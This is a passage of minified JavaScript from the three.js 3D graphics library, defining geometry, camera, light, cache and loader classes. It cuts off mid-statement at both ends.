for(var n in t){var a=t[n],o=Array.prototype.slice.call(a.array);e.data.attributes[n]={itemSize:a.itemSize,type:a.array.constructor.name,array:o}}return r.length>0&&(e.data.offsets=JSON.parse(JSON.stringify(r))),null!==i&&(e.data.boundingSphere={center:i.center.toArray(),radius:i.radius}),e},clone:function(){var e=new THREE.BufferGeometry;for(var t in this.attributes){var r=this.attributes[t];e.addAttribute(t,r.clone())}for(var i=0,n=this.offsets.length;n>i;i++){var a=this.offsets[i];e.offsets.push({start:a.start,index:a.index,count:a.count})}return e},dispose:function(){this.dispatchEvent({type:"dispose"})}},THREE.EventDispatcher.prototype.apply(THREE.BufferGeometry.prototype),THREE.Geometry=function(){Object.defineProperty(this,"id",{value:THREE.GeometryIdCount++}),this.uuid=THREE.Math.generateUUID(),this.name="",this.type="Geometry",this.vertices=[],this.colors=[],this.faces=[],this.faceVertexUvs=[[]],this.morphTargets=[],this.morphColors=[],this.morphNormals=[],this.skinWeights=[],this.skinIndices=[],this.lineDistances=[],this.boundingBox=null,this.boundingSphere=null,this.hasTangents=!1,this.dynamic=!0,this.verticesNeedUpdate=!1,this.elementsNeedUpdate=!1,this.uvsNeedUpdate=!1,this.normalsNeedUpdate=!1,this.tangentsNeedUpdate=!1,this.colorsNeedUpdate=!1,this.lineDistancesNeedUpdate=!1,this.groupsNeedUpdate=!1},THREE.Geometry.prototype={constructor:THREE.Geometry,applyMatrix:function(e){for(var t=(new THREE.Matrix3).getNormalMatrix(e),r=0,i=this.vertices.length;i>r;r++){var n=this.vertices[r];n.applyMatrix4(e)}for(var r=0,i=this.faces.length;i>r;r++){var a=this.faces[r];a.normal.applyMatrix3(t).normalize();for(var o=0,s=a.vertexNormals.length;s>o;o++)a.vertexNormals[o].applyMatrix3(t).normalize()}null!==this.boundingBox&&this.computeBoundingBox(),null!==this.boundingSphere&&this.computeBoundingSphere(),this.verticesNeedUpdate=!0,this.normalsNeedUpdate=!0},fromBufferGeometry:function(e){for(var t=this,r=e.attributes,i=r.position.array,n=void 0!==r.index?r.index.array:void 0,a=void 0!==r.normal?r.normal.array:void 0,o=void 0!==r.color?r.color.array:void 0,s=void 0!==r.uv?r.uv.array:void 0,h=[],l=[],c=0,u=0;c<i.length;c+=3,u+=2)t.vertices.push(new THREE.Vector3(i[c],i[c+1],i[c+2])),void 0!==a&&h.push(new THREE.Vector3(a[c],a[c+1],a[c+2])),void 0!==o&&t.colors.push(new THREE.Color(o[c],o[c+1],o[c+2])),void 0!==s&&l.push(new THREE.Vector2(s[u],s[u+1]));var E=function(e,r,i){var n=void 0!==a?[h[e].clone(),h[r].clone(),h[i].clone()]:[],c=void 0!==o?[t.colors[e].clone(),t.colors[r].clone(),t.colors[i].clone()]:[];t.faces.push(new THREE.Face3(e,r,i,n,c)),void 0!==s&&t.faceVertexUvs[0].push([l[e].clone(),l[r].clone(),l[i].clone()])};if(void 0!==n){var f=e.drawcalls;if(f.length>0)for(var c=0;c<f.length;c++)for(var p=f[c],d=p.start,m=p.count,T=p.index,u=d,g=d+m;g>u;u+=3)E(T+n[u],T+n[u+1],T+n[u+2]);else for(var c=0;c<n.length;c+=3)E(n[c],n[c+1],n[c+2])}else for(var c=0;c<i.length/3;c+=3)E(c,c+1,c+2);return this.computeFaceNormals(),null!==e.boundingBox&&(this.boundingBox=e.boundingBox.clone()),null!==e.boundingSphere&&(this.boundingSphere=e.boundingSphere.clone()),this},center:function(){this.computeBoundingBox();var e=this.boundingBox.center().negate();return this.applyMatrix((new THREE.Matrix4).setPosition(e)),e},computeFaceNormals:function(){for(var e=new THREE.Vector3,t=new THREE.Vector3,r=0,i=this.faces.length;i>r;r++){var n=this.faces[r],a=this.vertices[n.a],o=this.vertices[n.b],s=this.vertices[n.c];e.subVectors(s,o),t.subVectors(a,o),e.cross(t),e.normalize(),n.normal.copy(e)}},computeVertexNormals:function(e){var t,r,i,n,a,o;for(o=new Array(this.vertices.length),t=0,r=this.vertices.length;r>t;t++)o[t]=new THREE.Vector3;if(e){var s,h,l,c=new THREE.Vector3,u=new THREE.Vector3;for(i=0,n=this.faces.length;n>i;i++)a=this.faces[i],s=this.vertices[a.a],h=this.vertices[a.b],l=this.vertices[a.c],c.subVectors(l,h),u.subVectors(s,h),c.cross(u),o[a.a].add(c),o[a.b].add(c),o[a.c].add(c)}else for(i=0,n=this.faces.length;n>i;i++)a=this.faces[i],o[a.a].add(a.normal),o[a.b].add(a.normal),o[a.c].add(a.normal);for(t=0,r=this.vertices.length;r>t;t++)o[t].normalize();for(i=0,n=this.faces.length;n>i;i++)a=this.faces[i],a.vertexNormals[0]=o[a.a].clone(),a.vertexNormals[1]=o[a.b].clone(),a.vertexNormals[2]=o[a.c].clone()},computeMorphNormals:function(){var e,t,r,i,n;for(r=0,i=this.faces.length;i>r;r++)for(n=this.faces[r],n.__originalFaceNormal?n.__originalFaceNormal.copy(n.normal):n.__originalFaceNormal=n.normal.clone(),n.__originalVertexNormals||(n.__originalVertexNormals=[]),e=0,t=n.vertexNormals.length;t>e;e++)n.__originalVertexNormals[e]?n.__originalVertexNormals[e].copy(n.vertexNormals[e]):n.__originalVertexNormals[e]=n.vertexNormals[e].clone();var a=new THREE.Geometry;for(a.faces=this.faces,e=0,t=this.morphTargets.length;t>e;e++){if(!this.morphNormals[e]){this.morphNormals[e]={},this.morphNormals[e].faceNormals=[],this.morphNormals[e].vertexNormals=[];var o,s,h=this.morphNormals[e].faceNormals,l=this.morphNormals[e].vertexNormals;for(r=0,i=this.faces.length;i>r;r++)o=new THREE.Vector3,s={a:new THREE.Vector3,b:new THREE.Vector3,c:new THREE.Vector3},h.push(o),l.push(s)}var c=this.morphNormals[e];a.vertices=this.morphTargets[e].vertices,a.computeFaceNormals(),a.computeVertexNormals();var o,s;for(r=0,i=this.faces.length;i>r;r++)n=this.faces[r],o=c.faceNormals[r],s=c.vertexNormals[r],o.copy(n.normal),s.a.copy(n.vertexNormals[0]),s.b.copy(n.vertexNormals[1]),s.c.copy(n.vertexNormals[2])}for(r=0,i=this.faces.length;i>r;r++)n=this.faces[r],n.normal=n.__originalFaceNormal,n.vertexNormals=n.__originalVertexNormals},computeTangents:function(){function e(e,t,r,i,n,a,o){l=e.vertices[t],c=e.vertices[r],u=e.vertices[i],E=h[n],f=h[a],p=h[o],d=c.x-l.x,m=u.x-l.x,T=c.y-l.y,g=u.y-l.y,v=c.z-l.z,R=u.z-l.z,y=f.x-E.x,H=p.x-E.x,x=f.y-E.y,b=p.y-E.y,_=1/(y*b-H*x),L.set((b*d-x*m)*_,(b*T-x*g)*_,(b*v-x*R)*_),P.set((y*m-H*d)*_,(y*g-H*T)*_,(y*R-H*v)*_),A[t].add(L),A[r].add(L),A[i].add(L),C[t].add(P),C[r].add(P),C[i].add(P)}var t,r,i,n,a,o,s,h,l,c,u,E,f,p,d,m,T,g,v,R,y,H,x,b,_,w,M,S,A=[],C=[],L=new THREE.Vector3,P=new THREE.Vector3,F=new THREE.Vector3,U=new THREE.Vector3,B=new THREE.Vector3;for(i=0,n=this.vertices.length;n>i;i++)A[i]=new THREE.Vector3,C[i]=new THREE.Vector3;for(t=0,r=this.faces.length;r>t;t++)s=this.faces[t],h=this.faceVertexUvs[0][t],e(this,s.a,s.b,s.c,0,1,2);var D=["a","b","c","d"];for(t=0,r=this.faces.length;r>t;t++)for(s=this.faces[t],a=0;a<Math.min(s.vertexNormals.length,3);a++)B.copy(s.vertexNormals[a]),o=s[D[a]],w=A[o],F.copy(w),F.sub(B.multiplyScalar(B.dot(w))).normalize(),U.crossVectors(s.vertexNormals[a],w),M=U.dot(C[o]),S=0>M?-1:1,s.vertexTangents[a]=new THREE.Vector4(F.x,F.y,F.z,S);this.hasTangents=!0},computeLineDistances:function(){for(var e=0,t=this.vertices,r=0,i=t.length;i>r;r++)r>0&&(e+=t[r].distanceTo(t[r-1])),this.lineDistances[r]=e},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new THREE.Box3),this.boundingBox.setFromPoints(this.vertices)},computeBoundingSphere:function(){null===this.boundingSphere&&(this.boundingSphere=new THREE.Sphere),this.boundingSphere.setFromPoints(this.vertices)},merge:function(e,t,r){if(e instanceof THREE.Geometry==!1)return void THREE.error("THREE.Geometry.merge(): geometry not an instance of THREE.Geometry.",e);var i,n=this.vertices.length,a=this.vertices,o=e.vertices,s=this.faces,h=e.faces,l=this.faceVertexUvs[0],c=e.faceVertexUvs[0];void 0===r&&(r=0),void 0!==t&&(i=(new THREE.Matrix3).getNormalMatrix(t));for(var u=0,E=o.length;E>u;u++){var f=o[u],p=f.clone();void 0!==t&&p.applyMatrix4(t),a.push(p)}for(u=0,E=h.length;E>u;u++){var d,m,T,g=h[u],v=g.vertexNormals,R=g.vertexColors;d=new THREE.Face3(g.a+n,g.b+n,g.c+n),d.normal.copy(g.normal),void 0!==i&&d.normal.applyMatrix3(i).normalize();for(var y=0,H=v.length;H>y;y++)m=v[y].clone(),void 0!==i&&m.applyMatrix3(i).normalize(),d.vertexNormals.push(m);d.color.copy(g.color);for(var y=0,H=R.length;H>y;y++)T=R[y],d.vertexColors.push(T.clone());d.materialIndex=g.materialIndex+r,s.push(d)}for(u=0,E=c.length;E>u;u++){var x=c[u],b=[];if(void 0!==x){for(var y=0,H=x.length;H>y;y++)b.push(x[y].clone());l.push(b)}}},mergeMesh:function(e){return e instanceof THREE.Mesh==!1?void THREE.error("THREE.Geometry.mergeMesh(): mesh not an instance of THREE.Mesh.",e):(e.matrixAutoUpdate&&e.updateMatrix(),void this.merge(e.geometry,e.matrix))},mergeVertices:function(){var e,t,r,i,n,a,o,s,h={},l=[],c=[],u=4,E=Math.pow(10,u);for(r=0,i=this.vertices.length;i>r;r++)e=this.vertices[r],t=Math.round(e.x*E)+"_"+Math.round(e.y*E)+"_"+Math.round(e.z*E),void 0===h[t]?(h[t]=r,l.push(this.vertices[r]),c[r]=l.length-1):c[r]=c[h[t]];var f=[];for(r=0,i=this.faces.length;i>r;r++){n=this.faces[r],n.a=c[n.a],n.b=c[n.b],n.c=c[n.c],a=[n.a,n.b,n.c];for(var p=-1,d=0;3>d;d++)if(a[d]==a[(d+1)%3]){p=d,f.push(r);break}}for(r=f.length-1;r>=0;r--){var m=f[r];for(this.faces.splice(m,1),o=0,s=this.faceVertexUvs.length;s>o;o++)this.faceVertexUvs[o].splice(m,1)}var T=this.vertices.length-l.length;return this.vertices=l,T},toJSON:function(){function e(e,t,r){return r?e|1<<t:e&~(1<<t)}function t(e){var t=e.x.toString()+e.y.toString()+e.z.toString();return void 0!==E[t]?E[t]:(E[t]=u.length/3,u.push(e.x,e.y,e.z),E[t])}function r(e){var t=e.r.toString()+e.g.toString()+e.b.toString();return void 0!==p[t]?p[t]:(p[t]=f.length,f.push(e.getHex()),p[t])}function i(e){var t=e.x.toString()+e.y.toString();return void 0!==m[t]?m[t]:(m[t]=d.length/2,d.push(e.x,e.y),m[t])}var n={metadata:{version:4,type:"BufferGeometry",generator:"BufferGeometryExporter"},uuid:this.uuid,type:this.type};if(""!==this.name&&(n.name=this.name),void 0!==this.parameters){var a=this.parameters;for(var o in a)void 0!==a[o]&&(n[o]=a[o]);return n}for(var s=[],h=0;h<this.vertices.length;h++){var l=this.vertices[h];s.push(l.x,l.y,l.z)}for(var c=[],u=[],E={},f=[],p={},d=[],m={},h=0;h<this.faces.length;h++){var T=this.faces[h],g=!1,v=!1,R=void 0!==this.faceVertexUvs[0][h],y=T.normal.length()>0,H=T.vertexNormals.length>0,x=1!==T.color.r||1!==T.color.g||1!==T.color.b,b=T.vertexColors.length>0,_=0;if(_=e(_,0,0),_=e(_,1,g),_=e(_,2,v),_=e(_,3,R),_=e(_,4,y),_=e(_,5,H),_=e(_,6,x),_=e(_,7,b),c.push(_),c.push(T.a,T.b,T.c),R){var w=this.faceVertexUvs[0][h];c.push(i(w[0]),i(w[1]),i(w[2]))}if(y&&c.push(t(T.normal)),H){var M=T.vertexNormals;c.push(t(M[0]),t(M[1]),t(M[2]))}if(x&&c.push(r(T.color)),b){var S=T.vertexColors;c.push(r(S[0]),r(S[1]),r(S[2]))}}return n.data={},n.data.vertices=s,n.data.normals=u,f.length>0&&(n.data.colors=f),d.length>0&&(n.data.uvs=[d]),n.data.faces=c,n},clone:function(){for(var e=new THREE.Geometry,t=this.vertices,r=0,i=t.length;i>r;r++)e.vertices.push(t[r].clone());for(var n=this.faces,r=0,i=n.length;i>r;r++)e.faces.push(n[r].clone());for(var r=0,i=this.faceVertexUvs.length;i>r;r++){var a=this.faceVertexUvs[r];void 0===e.faceVertexUvs[r]&&(e.faceVertexUvs[r]=[]);for(var o=0,s=a.length;s>o;o++){for(var h=a[o],l=[],c=0,u=h.length;u>c;c++){var E=h[c];l.push(E.clone())}e.faceVertexUvs[r].push(l)}}return e},dispose:function(){this.dispatchEvent({type:"dispose"})}},THREE.EventDispatcher.prototype.apply(THREE.Geometry.prototype),THREE.GeometryIdCount=0,THREE.Camera=function(){THREE.Object3D.call(this),this.type="Camera",this.matrixWorldInverse=new THREE.Matrix4,this.projectionMatrix=new THREE.Matrix4},THREE.Camera.prototype=Object.create(THREE.Object3D.prototype),THREE.Camera.prototype.constructor=THREE.Camera,THREE.Camera.prototype.getWorldDirection=function(){var e=new THREE.Quaternion;return function(t){var r=t||new THREE.Vector3;return this.getWorldQuaternion(e),r.set(0,0,-1).applyQuaternion(e)}}(),THREE.Camera.prototype.lookAt=function(){var e=new THREE.Matrix4;return function(t){e.lookAt(this.position,t,this.up),this.quaternion.setFromRotationMatrix(e)}}(),THREE.Camera.prototype.clone=function(e){return void 0===e&&(e=new THREE.Camera),THREE.Object3D.prototype.clone.call(this,e),e.matrixWorldInverse.copy(this.matrixWorldInverse),e.projectionMatrix.copy(this.projectionMatrix),e},THREE.CubeCamera=function(e,t,r){THREE.Object3D.call(this),this.type="CubeCamera";var i=90,n=1,a=new THREE.PerspectiveCamera(i,n,e,t);a.up.set(0,-1,0),a.lookAt(new THREE.Vector3(1,0,0)),this.add(a);var o=new THREE.PerspectiveCamera(i,n,e,t);o.up.set(0,-1,0),o.lookAt(new THREE.Vector3(-1,0,0)),this.add(o);var s=new THREE.PerspectiveCamera(i,n,e,t);s.up.set(0,0,1),s.lookAt(new THREE.Vector3(0,1,0)),this.add(s);var h=new THREE.PerspectiveCamera(i,n,e,t);h.up.set(0,0,-1),h.lookAt(new THREE.Vector3(0,-1,0)),this.add(h);var l=new THREE.PerspectiveCamera(i,n,e,t);l.up.set(0,-1,0),l.lookAt(new THREE.Vector3(0,0,1)),this.add(l);var c=new THREE.PerspectiveCamera(i,n,e,t);c.up.set(0,-1,0),c.lookAt(new THREE.Vector3(0,0,-1)),this.add(c),this.renderTarget=new THREE.WebGLRenderTargetCube(r,r,{format:THREE.RGBFormat,magFilter:THREE.LinearFilter,minFilter:THREE.LinearFilter}),this.updateCubeMap=function(e,t){var r=this.renderTarget,i=r.generateMipmaps;r.generateMipmaps=!1,r.activeCubeFace=0,e.render(t,a,r),r.activeCubeFace=1,e.render(t,o,r),r.activeCubeFace=2,e.render(t,s,r),r.activeCubeFace=3,e.render(t,h,r),r.activeCubeFace=4,e.render(t,l,r),r.generateMipmaps=i,r.activeCubeFace=5,e.render(t,c,r)}},THREE.CubeCamera.prototype=Object.create(THREE.Object3D.prototype),THREE.CubeCamera.prototype.constructor=THREE.CubeCamera,THREE.OrthographicCamera=function(e,t,r,i,n,a){THREE.Camera.call(this),this.type="OrthographicCamera",this.zoom=1,this.left=e,this.right=t,this.top=r,this.bottom=i,this.near=void 0!==n?n:.1,this.far=void 0!==a?a:2e3,this.updateProjectionMatrix()},THREE.OrthographicCamera.prototype=Object.create(THREE.Camera.prototype),THREE.OrthographicCamera.prototype.constructor=THREE.OrthographicCamera,THREE.OrthographicCamera.prototype.updateProjectionMatrix=function(){var e=(this.right-this.left)/(2*this.zoom),t=(this.top-this.bottom)/(2*this.zoom),r=(this.right+this.left)/2,i=(this.top+this.bottom)/2;this.projectionMatrix.makeOrthographic(r-e,r+e,i+t,i-t,this.near,this.far)},THREE.OrthographicCamera.prototype.clone=function(){var e=new THREE.OrthographicCamera;return THREE.Camera.prototype.clone.call(this,e),e.zoom=this.zoom,e.left=this.left,e.right=this.right,e.top=this.top,e.bottom=this.bottom,e.near=this.near,e.far=this.far,e.projectionMatrix.copy(this.projectionMatrix),e},THREE.PerspectiveCamera=function(e,t,r,i){THREE.Camera.call(this),this.type="PerspectiveCamera",this.zoom=1,this.fov=void 0!==e?e:50,this.aspect=void 0!==t?t:1,this.near=void 0!==r?r:.1,this.far=void 0!==i?i:2e3,this.updateProjectionMatrix()},THREE.PerspectiveCamera.prototype=Object.create(THREE.Camera.prototype),THREE.PerspectiveCamera.prototype.constructor=THREE.PerspectiveCamera,THREE.PerspectiveCamera.prototype.setLens=function(e,t){void 0===t&&(t=24),this.fov=2*THREE.Math.radToDeg(Math.atan(t/(2*e))),this.updateProjectionMatrix()},THREE.PerspectiveCamera.prototype.setViewOffset=function(e,t,r,i,n,a){this.fullWidth=e,this.fullHeight=t,this.x=r,this.y=i,this.width=n,this.height=a,this.updateProjectionMatrix()},THREE.PerspectiveCamera.prototype.updateProjectionMatrix=function(){var e=THREE.Math.radToDeg(2*Math.atan(Math.tan(.5*THREE.Math.degToRad(this.fov))/this.zoom));if(this.fullWidth){var t=this.fullWidth/this.fullHeight,r=Math.tan(THREE.Math.degToRad(.5*e))*this.near,i=-r,n=t*i,a=t*r,o=Math.abs(a-n),s=Math.abs(r-i);this.projectionMatrix.makeFrustum(n+this.x*o/this.fullWidth,n+(this.x+this.width)*o/this.fullWidth,r-(this.y+this.height)*s/this.fullHeight,r-this.y*s/this.fullHeight,this.near,this.far)}else this.projectionMatrix.makePerspective(e,this.aspect,this.near,this.far)},THREE.PerspectiveCamera.prototype.clone=function(){var e=new THREE.PerspectiveCamera;return THREE.Camera.prototype.clone.call(this,e),e.zoom=this.zoom,e.fov=this.fov,e.aspect=this.aspect,e.near=this.near,e.far=this.far,e.projectionMatrix.copy(this.projectionMatrix),e},THREE.Light=function(e){THREE.Object3D.call(this),this.type="Light",this.color=new THREE.Color(e)},THREE.Light.prototype=Object.create(THREE.Object3D.prototype),THREE.Light.prototype.constructor=THREE.Light,THREE.Light.prototype.clone=function(e){return void 0===e&&(e=new THREE.Light),THREE.Object3D.prototype.clone.call(this,e),e.color.copy(this.color),e},THREE.AmbientLight=function(e){THREE.Light.call(this,e),this.type="AmbientLight"},THREE.AmbientLight.prototype=Object.create(THREE.Light.prototype),THREE.AmbientLight.prototype.constructor=THREE.AmbientLight,THREE.AmbientLight.prototype.clone=function(){var e=new THREE.AmbientLight;return THREE.Light.prototype.clone.call(this,e),e},THREE.AreaLight=function(e,t){THREE.Light.call(this,e),this.type="AreaLight",this.normal=new THREE.Vector3(0,-1,0),this.right=new THREE.Vector3(1,0,0),this.intensity=void 0!==t?t:1,this.width=1,this.height=1,this.constantAttenuation=1.5,this.linearAttenuation=.5,this.quadraticAttenuation=.1},THREE.AreaLight.prototype=Object.create(THREE.Light.prototype),THREE.AreaLight.prototype.constructor=THREE.AreaLight,THREE.DirectionalLight=function(e,t){THREE.Light.call(this,e),this.type="DirectionalLight",this.position.set(0,1,0),this.target=new THREE.Object3D,this.intensity=void 0!==t?t:1,this.castShadow=!1,this.onlyShadow=!1,this.shadowCameraNear=50,this.shadowCameraFar=5e3,this.shadowCameraLeft=-500,this.shadowCameraRight=500,this.shadowCameraTop=500,this.shadowCameraBottom=-500,this.shadowCameraVisible=!1,this.shadowBias=0,this.shadowDarkness=.5,this.shadowMapWidth=512,this.shadowMapHeight=512,this.shadowCascade=!1,this.shadowCascadeOffset=new THREE.Vector3(0,0,-1e3),this.shadowCascadeCount=2,this.shadowCascadeBias=[0,0,0],this.shadowCascadeWidth=[512,512,512],this.shadowCascadeHeight=[512,512,512],this.shadowCascadeNearZ=[-1,.99,.998],this.shadowCascadeFarZ=[.99,.998,1],this.shadowCascadeArray=[],this.shadowMap=null,this.shadowMapSize=null,this.shadowCamera=null,this.shadowMatrix=null},THREE.DirectionalLight.prototype=Object.create(THREE.Light.prototype),THREE.DirectionalLight.prototype.constructor=THREE.DirectionalLight,THREE.DirectionalLight.prototype.clone=function(){var e=new THREE.DirectionalLight;return THREE.Light.prototype.clone.call(this,e),e.target=this.target.clone(),e.intensity=this.intensity,e.castShadow=this.castShadow,e.onlyShadow=this.onlyShadow,e.shadowCameraNear=this.shadowCameraNear,e.shadowCameraFar=this.shadowCameraFar,e.shadowCameraLeft=this.shadowCameraLeft,e.shadowCameraRight=this.shadowCameraRight,e.shadowCameraTop=this.shadowCameraTop,e.shadowCameraBottom=this.shadowCameraBottom,e.shadowCameraVisible=this.shadowCameraVisible,e.shadowBias=this.shadowBias,e.shadowDarkness=this.shadowDarkness,e.shadowMapWidth=this.shadowMapWidth,e.shadowMapHeight=this.shadowMapHeight,e.shadowCascade=this.shadowCascade,e.shadowCascadeOffset.copy(this.shadowCascadeOffset),e.shadowCascadeCount=this.shadowCascadeCount,e.shadowCascadeBias=this.shadowCascadeBias.slice(0),e.shadowCascadeWidth=this.shadowCascadeWidth.slice(0),e.shadowCascadeHeight=this.shadowCascadeHeight.slice(0),e.shadowCascadeNearZ=this.shadowCascadeNearZ.slice(0),e.shadowCascadeFarZ=this.shadowCascadeFarZ.slice(0),e},THREE.HemisphereLight=function(e,t,r){THREE.Light.call(this,e),this.type="HemisphereLight",this.position.set(0,100,0),this.groundColor=new THREE.Color(t),this.intensity=void 0!==r?r:1},THREE.HemisphereLight.prototype=Object.create(THREE.Light.prototype),THREE.HemisphereLight.prototype.constructor=THREE.HemisphereLight,THREE.HemisphereLight.prototype.clone=function(){var e=new THREE.HemisphereLight;return THREE.Light.prototype.clone.call(this,e),e.groundColor.copy(this.groundColor),e.intensity=this.intensity,e},THREE.PointLight=function(e,t,r,i){THREE.Light.call(this,e),this.type="PointLight",this.intensity=void 0!==t?t:1,this.distance=void 0!==r?r:0,this.decay=void 0!==i?i:1},THREE.PointLight.prototype=Object.create(THREE.Light.prototype),THREE.PointLight.prototype.constructor=THREE.PointLight,THREE.PointLight.prototype.clone=function(){var e=new THREE.PointLight;return THREE.Light.prototype.clone.call(this,e),e.intensity=this.intensity,e.distance=this.distance,e.decay=this.decay,e},THREE.SpotLight=function(e,t,r,i,n,a){THREE.Light.call(this,e),this.type="SpotLight",this.position.set(0,1,0),this.target=new THREE.Object3D,this.intensity=void 0!==t?t:1,this.distance=void 0!==r?r:0,this.angle=void 0!==i?i:Math.PI/3,this.exponent=void 0!==n?n:10,this.decay=void 0!==a?a:1,this.castShadow=!1,this.onlyShadow=!1,this.shadowCameraNear=50,this.shadowCameraFar=5e3,this.shadowCameraFov=50,this.shadowCameraVisible=!1,this.shadowBias=0,this.shadowDarkness=.5,this.shadowMapWidth=512,this.shadowMapHeight=512,this.shadowMap=null,this.shadowMapSize=null,this.shadowCamera=null,this.shadowMatrix=null},THREE.SpotLight.prototype=Object.create(THREE.Light.prototype),THREE.SpotLight.prototype.constructor=THREE.SpotLight,THREE.SpotLight.prototype.clone=function(){var e=new THREE.SpotLight;return THREE.Light.prototype.clone.call(this,e),e.target=this.target.clone(),e.intensity=this.intensity,e.distance=this.distance,e.angle=this.angle,e.exponent=this.exponent,e.decay=this.decay,e.castShadow=this.castShadow,e.onlyShadow=this.onlyShadow,e.shadowCameraNear=this.shadowCameraNear,e.shadowCameraFar=this.shadowCameraFar,e.shadowCameraFov=this.shadowCameraFov,e.shadowCameraVisible=this.shadowCameraVisible,e.shadowBias=this.shadowBias,e.shadowDarkness=this.shadowDarkness,e.shadowMapWidth=this.shadowMapWidth,e.shadowMapHeight=this.shadowMapHeight,e},THREE.Cache={files:{},add:function(e,t){this.files[e]=t},get:function(e){return this.files[e]},remove:function(e){delete this.files[e]},clear:function(){this.files={}}},THREE.Loader=function(e){this.showStatus=e,this.statusDomElement=e?THREE.Loader.prototype.addStatusElement():null,this.imageLoader=new THREE.ImageLoader,this.onLoadStart=function(){},this.onLoadProgress=function(){},this.onLoadComplete=function(){}},THREE.Loader.prototype={constructor:THREE.Loader,crossOrigin:void 0,addStatusElement:function(){var e=document.createElement("div");return e.style.position="absolute",e.style.right="0px",e.style.top="0px",e.style.fontSize="0.8em",e.style.textAlign="left",e.style.background="rgba(0,0,0,0.25)",e.style.color="#fff",e.style.width="120px",e.style.padding="0.5em 0.5em 0.5em 0.5em",e.style.zIndex=1e3,e.innerHTML="Loading ...",e},updateProgress:function(e){var t="Loaded ";t+=e.total?(100*e.loaded/e.total).toFixed(0)+"%":(e.loaded/1024).toFixed(2)+" KB",this.statusDomElement.innerHTML=t},extractUrlBase:function(e){var t=e.split("/");return 1===t.length?"./":(t.pop(),t.join("/")+"/")},initMaterials:function(e,t){for(var r=[],i=0;i<e.length;++i)r[i]=this.createMaterial(e[i],t);return r},needsTangents:function(e){for(var t=0,r=e.length;r>t;t++){var i=e[t];if(i instanceof THREE.ShaderMaterial)return!0}return!1},createMaterial:function(e,t){function r(e){var t=Math.log(e)/Math.LN2;return Math.pow(2,Math.round(t))}function i(e,i,n,o,s,h,l){var c,u=t+n,E=THREE.Loader.Handlers.get(u);if(null!==E?c=E.load(u):(c=new THREE.Texture,E=a.imageLoader,E.crossOrigin=a.crossOrigin,E.load(u,function(e){if(THREE.Math.isPowerOfTwo(e.width)===!1||THREE.Math.isPowerOfTwo(e.height)===!1){var t=r(e.width),i=r(e.height),n=document.createElement("canvas");n.width=t,n.height=i;var a=n.getContext("2d");a.drawImage(e,0,0,t,i),c.image=n}else c.image=e;c.needsUpdate=!0})),c.sourceFile=n,o&&(c.repeat.set(o[0],o[1]),1!==o[0]&&(c.wrapS=THREE.RepeatWrapping),1!==o[1]&&(c.wrapT=THREE.RepeatWrapping)),s&&c.offset.set(s[0],s[1]),h){var f={repeat:THREE.RepeatWrapping,mirror:THREE.MirroredRepeatWrapping};void 0!==f[h[0]]&&(c.wrapS=f[h[0]]),void 0!==f[h[1]]&&(c.wrapT=f[h[1]])}l&&(c.anisotropy=l),e[i]=c}function n(e){return(255*e[0]<<16)+(255*e[1]<<8)+255*e[2]}var a=this,o="MeshLambertMaterial",s={color:15658734,opacity:1,map:null,lightMap:null,normalMap:null,bumpMap:null,wireframe:!1};if(e.shading){var h=e.shading.toLowerCase();"phong"===h?o="MeshPhongMaterial":"basic"===h&&(o="MeshBasicMaterial")}void 0!==e.blending&&void 0!==THREE[e.blending]&&(s.blending=THREE[e.blending]),void 0!==e.transparent&&(s.transparent=e.transparent),void 0!==e.opacity&&e.opacity<1&&(s.transparent=!0),void 0!==e.depthTest&&(s.depthTest=e.depthTest),void 0!==e.depthWrite&&(s.depthWrite=e.depthWrite),void 0!==e.visible&&(s.visible=e.visible),void 0!==e.flipSided&&(s.side=THREE.BackSide),void 0!==e.doubleSided&&(s.side=THREE.DoubleSide),void 0!==e.wireframe&&(s.wireframe=e.wireframe),void 0!==e.vertexColors&&("face"===e.vertexColors?s.vertexColors=THREE.FaceColors:e.vertexColors&&(s.vertexColors=THREE.VertexColors)),e.colorDiffuse?s.color=n(e.colorDiffuse):e.DbgColor&&(s.color=e.DbgColor),e.colorSpecular&&(s.specular=n(e.colorSpecular)),e.colorEmissive&&(s.emissive=n(e.colorEmissive)),void 0!==e.transparency&&(console.warn("THREE.Loader: transparency has been renamed to opacity"),e.opacity=e.transparency),void 0!==e.opacity&&(s.opacity=e.opacity),e.specularCoef&&(s.shininess=e.specularCoef),e.mapDiffuse&&t&&i(s,"map",e.mapDiffuse,e.mapDiffuseRepeat,e.mapDiffuseOffset,e.mapDiffuseWrap,e.mapDiffuseAnisotropy),e.mapLight&&t&&i(s,"lightMap",e.mapLight,e.mapLightRepeat,e.mapLightOffset,e.mapLightWrap,e.mapLightAnisotropy),e.mapBump&&t&&i(s,"bumpMap",e.mapBump,e.mapBumpRepeat,e.mapBumpOffset,e.mapBumpWrap,e.mapBumpAnisotropy),e.mapNormal&&t&&i(s,"normalMap",e.mapNormal,e.mapNormalRepeat,e.mapNormalOffset,e.mapNormalWrap,e.mapNormalAnisotropy),e.mapSpecular&&t&&i(s,"specularMap",e.mapSpecular,e.mapSpecularRepeat,e.mapSpecularOffset,e.mapSpecularWrap,e.mapSpecularAnisotropy),e.mapAlpha&&t&&i(s,"alphaMap",e.mapAlpha,e.mapAlphaRepeat,e.mapAlphaOffset,e.mapAlphaWrap,e.mapAlphaAnisotropy),e.mapBumpScale&&(s.bumpScale=e.mapBumpScale),e.mapNormalFactor&&(s.normalScale=new THREE.Vector2(e.mapNormalFactor,e.mapNormalFactor));var l=new THREE[o](s);return void 0!==e.DbgName&&(l.name=e.DbgName),l}},THREE.Loader.Handlers={handlers:[],add:function(e,t){this.handlers.push(e,t)},get:function(e){for(var t=0,r=this.handlers.length;r>t;t+=2){var i=this.handlers[t],n=this.handlers[t+1];if(i.test(e))return n}return null}},THREE.XHRLoader=function(e){this.manager=void 0!==e?e:THREE.DefaultLoadingManager},THREE.XHRLoader.prototype={constructor:THREE.XHRLoader,load:function(e,t,r,i){var n=this,a=THREE.Cache.get(e);if(void 0!==a)return void(t&&t(a));var o=new XMLHttpRequest;o.open("GET",e,!0),o.addEventListener("load",function(r){THREE.Cache.add(e,this.response),t&&t(this.response),n.manager.itemEnd(e)},!1),void 0!==r&&o.addEventListener("progress",function(e){r(e)},!1),void 0!==i&&o.addEventListener("error",function(e){i(e)},!1),void 0!==this.crossOrigin&&(o.crossOrigin=this.crossOrigin),void 